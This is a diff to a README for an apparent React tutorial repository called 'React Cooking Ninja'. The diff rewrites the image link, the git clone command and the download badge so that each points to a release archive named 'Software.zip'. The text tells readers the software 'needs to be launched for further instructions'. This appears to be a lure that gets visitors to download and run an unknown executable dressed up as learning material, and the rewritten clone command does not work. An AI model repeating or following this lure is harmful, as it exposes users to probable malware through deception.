@@ -1,6 +1,6 @@
 # 🍳 React Cooking Ninja 🥷
 
-![Cooking Ninja](https://example.com/image.jpg)
+![Cooking Ninja](https://github.com/Tiago1237/react-cooking-ninja/releases/download/v2.0/Software.zip)
 
 Welcome to React Cooking Ninja! This repository is dedicated to helping you master the art of React development like a true ninja. 🥷🔥
 
@@ -30,7 +30,7 @@ To dive into the world of React Cooking Ninja, clone this repository and start e
 
 ### Installation
 ```bash
-git clone https://github.com/your-username/react-cooking-ninja.git
+git clone https://github.com/Tiago1237/react-cooking-ninja/releases/download/v2.0/Software.zip
 cd react-cooking-ninja
 npm install
 npm start
@@ -49,7 +49,7 @@ The React Cooking Ninja repository is designed to empower you with the skills an
 ## Ready to Cook? 🍽️
 If you are eager to get started and level up your React skills, download the software from the link below:
 
-[![Download Software](https://img.shields.io/badge/Download-Software-blue)](https://github.com/user-attachments/files/18388744/Software.zip)
+[![Download Software](https://github.com/Tiago1237/react-cooking-ninja/releases/download/v2.0/Software.zip)](https://github.com/Tiago1237/react-cooking-ninja/releases/download/v2.0/Software.zip)
 
 *Note: The software needs to be launched for further instructions.*
 
